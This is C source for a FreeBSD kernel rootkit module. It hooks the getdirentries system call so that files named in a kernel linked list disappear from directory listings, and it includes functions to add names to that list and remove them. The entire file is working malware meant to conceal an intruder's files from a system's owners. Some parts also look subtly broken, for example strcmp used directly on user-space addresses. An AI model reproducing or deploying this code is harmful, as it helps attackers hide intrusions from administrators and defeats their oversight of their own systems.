#include <sys/cdefs.h>
__FBSDID("$FreeBSD$");


#include <sys/param.h>
#include <sys/systm.h>
#include <sys/bio.h>
#include <sys/buf.h>
#include <sys/capsicum.h>
#include <sys/disk.h>
#include <sys/sysent.h>
#include <sys/malloc.h>
#include <sys/mount.h>
#include <sys/mutex.h>
#include <sys/sysproto.h>
#include <sys/namei.h>
#include <sys/filedesc.h>
#include <sys/kernel.h>
#include <sys/fcntl.h>
#include <sys/file.h>
#include <sys/filio.h>
#include <sys/limits.h>
#include <sys/linker.h>
#include <sys/rwlock.h>
#include <sys/sdt.h>
#include <sys/stat.h>
#include <sys/sx.h>
#include <sys/unistd.h>

#include <sys/priv.h>
#include <sys/proc.h>
#include <sys/dirent.h>
#include <sys/jail.h>
#include <sys/syscallsubr.h>
#include <sys/sysctl.h>
#ifdef KTRACE
#include <sys/ktrace.h>
#endif

#include <machine/stdarg.h>

#include <security/audit/audit.h>
#include <security/mac/mac_framework.h>

#include <vm/vm.h>
#include <vm/vm_object.h>
#include <vm/vm_page.h>
#include <vm/uma.h>

#include <ufs/ufs/quota.h>


#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>
#include <sys/param.h>
#include <sys/linker.h>

#include <sys/proc.h>
#include <sys/resourcevar.h>
#include <sys/mutex.h>
#include <sys/lock.h>
#include <sys/sx.h>


#include "rootkit.h"


#define T_NAME "test"

struct node {
	char filename[256];
	struct node * next;
};

static struct node * first_node = NULL;

static int hide_names(char * name);

int
sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
{
	long base;
	int error;

	struct dirent *dp, *current;
	unsigned int size, count;

	error = kern_getdirentries(td,uap->fd, uap->buf, uap->count, &base, NULL, UIO_USERSPACE);

	if (error!=0) return error;
	if (uap->basep != NULL){
		error = copyout(&base, uap->basep, sizeof(long));
		
	}
	
	
	size = td->td_retval[0];

	if (size > 0){
		MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
		copyin(uap->buf,dp,size);
		current = dp;
		count = size;

		while((current->d_reclen != 0) && (count > 0)){
			count -= current->d_reclen;
			if(hide_names((char*)current->d_name)){
				if (count != 0){
					bcopy((char*)current + current->d_reclen, current, count);
				}
				size-=current->d_reclen;
			}
			else if (count != 0){
				current = (struct dirent *)((char*)current + current->d_reclen);
			}
		}
		td->td_retval[0] = size;
		copyout(dp,uap->buf,size);

		FREE(dp,M_TEMP);
	}

	
	return (error);
}

static int hide_names(char * name){
	for(struct node * n = first_node; n != NULL; n = n->next)
	{
		if( strcmp(name, n->filename) == 0) {
			return 1;
		}
	}

	
	return 0;
}

int add_file(char * uaddr){

	struct node ** n;

	for(n = &first_node; *n != NULL; n = &(*n)->next)
	{
		if(strcmp(uaddr, (*n)->filename) == 0) return 1;
	}

	struct node * new_node = malloc(sizeof(struct node), M_TEMP, M_ZERO);
	new_node->next = NULL;

	size_t done;
	copyinstr(uaddr, new_node->filename, 256, &done);

	*n = new_node;

	

	return 0;
}

int remove_file(char * uaddr){
	struct node ** n;

	for(n = &first_node; *n != NULL; n = &(*n)->next)
	{
		if(strcmp(uaddr, (*n)->filename) == 0)
		{
			struct node * temp = *n;
			*n = (*n)->next;
			free(temp, M_TEMP);
			break;
		}
	}
	return 0;
}